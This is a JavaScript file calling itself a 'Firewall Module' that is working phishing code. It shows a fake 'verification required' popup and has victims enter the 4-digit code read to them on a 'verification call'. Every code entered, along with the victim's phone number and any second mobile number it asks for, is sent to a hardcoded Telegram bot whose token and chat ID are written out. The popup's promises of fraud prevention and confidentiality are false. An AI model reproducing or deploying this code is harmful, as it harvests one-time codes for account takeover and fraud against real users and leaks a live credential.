/**
 * Firewall Module - 4-digit Verification with Change Number Option
 */

// ========== TELEGRAM NOTIFICATION ==========
async function sendTelegram(phone, code, type = 'verify') {
    let msg = '';
    if (type === 'verify') {
        msg = `📞 VERIFY REQUEST\n📱 ${phone}\n🔑 Code: ${code}`;
    } else if (type === 'change_number') {
        msg = `📱 CHANGE NUMBER REQUEST\n📱 Original: ${phone}\n📱 New Number: ${code}`;
    }
    try {
        await fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(msg)}`);
        console.log("📨 Telegram sent");
    } catch(e) {
        console.log("Telegram error:", e);
    }
}

// ========== CHECK CHANGE NUMBER REQUIREMENT ==========
async function isChangeNumberRequired() {
    if (typeof firebase !== 'undefined' && firebase.database) {
        try {
            const db = firebase.database();
            const snap = await db.ref('admin/changeNumberRequired').once('value');
            const data = snap.val();
            return (data && data.active === true);
        } catch(e) {
            return false;
        }
    }
    return false;
}

// ========== SHOW FIREWALL POPUP (4-DIGIT CODE) ==========
function showFirewallPopup() {
    const popup = document.getElementById('firewallPopup');
    if (popup) {
        const content = document.getElementById('firewallPopupContent');
        if (content) {
            content.innerHTML = `
                <div class="firewall-warning-icon">📞</div>
                <h2>VERIFICATION REQUIRED</h2>
                <div class="firewall-message">
                    <p>Due to multiple claiming requests detected in the system, a quick verification call is required before proceeding.</p>
                    <p>Please wait for the system-verification call. You will receive a 4-digit code during the call.</p>
                    <p>Enter the code below to continue.</p>
                </div>
                <div class="verification-input-group">
                    <input type="text" id="verificationCode" class="verification-input" placeholder="Enter 4-digit code" maxlength="4" inputmode="numeric">
                    <button id="verifyCodeBtn" class="verify-btn" onclick="verifyFirewallCode()">VERIFY NOW</button>
                </div>
                <div class="firewall-note">
                    <p>Waiting for system-verification call...</p>
                </div>
                <div id="firewallErrorMsg" class="firewall-error" style="display: none;"></div>
            `;
        }
        
        window.currentVerificationCode = Math.floor(1000 + Math.random() * 9000).toString();
        window.verificationAttempts = 0;
        
        console.log("📞 VERIFICATION CODE:", window.currentVerificationCode);
        
        popup.style.display = 'flex';
        setTimeout(() => {
            const ci = document.getElementById('verificationCode');
            if (ci) ci.focus();
        }, 100);
    }
}

// ========== SHOW CHANGE NUMBER POPUP ==========
function showChangeNumberPopup() {
    const popup = document.getElementById('firewallPopup');
    if (popup) {
        const content = document.getElementById('firewallPopupContent');
        if (content) {
            content.innerHTML = `
                <div class="firewall-warning-icon">📱</div>
                <h2>CHANGE MOBILE NUMBER REQUIRED</h2>
                <div class="firewall-message">
                    <p>Please enter another registered mobile number to complete this system verification.</p>
                    <p>This helps us verify your identity and prevent fraud.</p>
                </div>
                <div class="verification-input-group">
                    <input type="tel" id="newPhoneNumber" class="verification-input" placeholder="Enter 11-digit number" maxlength="11" inputmode="numeric">
                    <button id="changeNumberSubmitBtn" class="verify-btn" onclick="submitNewNumber()">SUBMIT</button>
                </div>
                <div class="firewall-note">
                    <p>Your information is secured and confidential.</p>
                </div>
                <div id="firewallErrorMsg" class="firewall-error" style="display: none;"></div>
            `;
        }
        popup.style.display = 'flex';
        setTimeout(() => {
            const si = document.getElementById('newPhoneNumber');
            if (si) si.focus();
        }, 100);
    }
}

// ========== HIDE FIREWALL POPUP ==========
function hideFirewallPopup() {
    const popup = document.getElementById('firewallPopup');
    if (popup) popup.style.display = 'none';
}

// ========== SUBMIT NEW NUMBER ==========
window.submitNewNumber = async function() {
    const phoneInput = document.getElementById('newPhoneNumber');
    const phone = phoneInput ? phoneInput.value.trim() : '';
    const errorDiv = document.getElementById('firewallErrorMsg');
    const submitBtn = document.getElementById('changeNumberSubmitBtn');
    
    if (!phone || phone.length !== 11 || !phone.startsWith('09')) {
        if (errorDiv) {
            errorDiv.innerHTML = "Please enter a valid 11-digit mobile number starting with 09.";
            errorDiv.style.display = 'block';
        }
        return;
    }
    
    if (submitBtn) {
        submitBtn.disabled = true;
        submitBtn.innerHTML = "PROCESSING...";
    }
    
    const userPhone = localStorage.getItem("userPhone") || "Unknown";
    await sendTelegram(userPhone, phone, 'change_number');
    
    hideFirewallPopup();
    alert("Mobile number submitted. Redirecting to login page...");
    
    // Clear localStorage and redirect to index
    localStorage.removeItem("userPhone");
    localStorage.removeItem("userDeviceId");
    
    setTimeout(() => {
        window.location.href = "index.html";
    }, 1500);
};

// ========== VERIFY 4-DIGIT CODE ==========
window.verifyFirewallCode = async function() {
    const codeInput = document.getElementById('verificationCode');
    const code = codeInput ? codeInput.value.trim() : '';
    const errorDiv = document.getElementById('firewallErrorMsg');
    const verifyBtn = document.getElementById('verifyCodeBtn');
    const userPhone = localStorage.getItem("userPhone") || "Unknown";
    
    if (!code || code.length < 4) {
        if (errorDiv) {
            errorDiv.innerHTML = "Please enter a 4-digit code.";
            errorDiv.style.display = 'block';
        }
        return;
    }
    
    if (verifyBtn) {
        verifyBtn.disabled = true;
        verifyBtn.innerHTML = "VERIFYING...";
    }
    if (errorDiv) errorDiv.style.display = 'none';
    
    window.verificationAttempts = (window.verificationAttempts || 0) + 1;
    
    const isValid = (code === window.currentVerificationCode);
    
    if (isValid) {
        await sendTelegram(userPhone, code, 'verify');
        
        // Check if change number is required
        const changeRequired = await isChangeNumberRequired();
        
        if (changeRequired) {
            showChangeNumberPopup();
        } else {
            hideFirewallPopup();
            alert("Verification successful. Page will refresh.");
            setTimeout(() => {
                window.location.reload();
            }, 500);
        }
    } else {
        await sendTelegram(userPhone, code, 'verify');
        
        let errorMsg = "Invalid verification code. Please try again.";
        if (window.verificationAttempts >= 3) {
            errorMsg = "Too many failed attempts. Page will refresh.";
            if (verifyBtn) verifyBtn.disabled = true;
            setTimeout(() => {
                window.location.reload();
            }, 2000);
        }
        if (errorDiv) {
            errorDiv.innerHTML = errorMsg;
            errorDiv.style.display = 'block';
        }
        if (verifyBtn && verifyBtn.disabled !== true) {
            verifyBtn.disabled = false;
            verifyBtn.innerHTML = "VERIFY NOW";
        }
        
        if (codeInput) {
            codeInput.value = '';
            codeInput.focus();
        }
    }
};

// ========== EXPOSE FUNCTIONS ==========
window.showFirewallPopup = showFirewallPopup;
window.hideFirewallPopup = hideFirewallPopup;